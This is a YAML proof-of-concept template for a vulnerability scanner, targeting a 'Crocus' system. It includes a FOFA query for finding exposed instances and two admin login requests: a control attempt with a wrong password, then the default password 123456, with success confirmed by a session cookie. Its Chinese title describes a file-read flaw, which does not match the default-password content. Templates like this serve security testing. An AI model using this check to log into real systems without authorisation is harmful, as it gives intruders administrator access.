id: poc-yaml-crocus-default-password-login
info:
  name: Crocus系统Download接口 文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: Crocus系统
  fofa: title="Crocus" && body="ThirdResource"
requests:
- method: POST
  path: /RegisterLogin.do?Action=Login
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: UserName=admin&Password=111111111111111&MailCode=&AuthCode=
  expression: "status_code == 200 &&\ncontains(find_json(body,\"Result\"), \"false\"\
    ) && \ncontains(find_json(body,\"Code\"), \"200\") &&\n!contains(headers,\"Saffron.U=\"\
    )\n"
- method: POST
  path: /RegisterLogin.do?Action=Login
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: UserName=admin&Password=123456&MailCode=&AuthCode=
  expression: "status_code == 200 &&\ncontains(find_json(body,\"Result\"), \"true\"\
    ) && \ncontains(find_json(body,\"Code\"), \"200\") &&\ncontains(headers,\"Saffron.U=\"\
    )\n"
variables: {}
transport: http
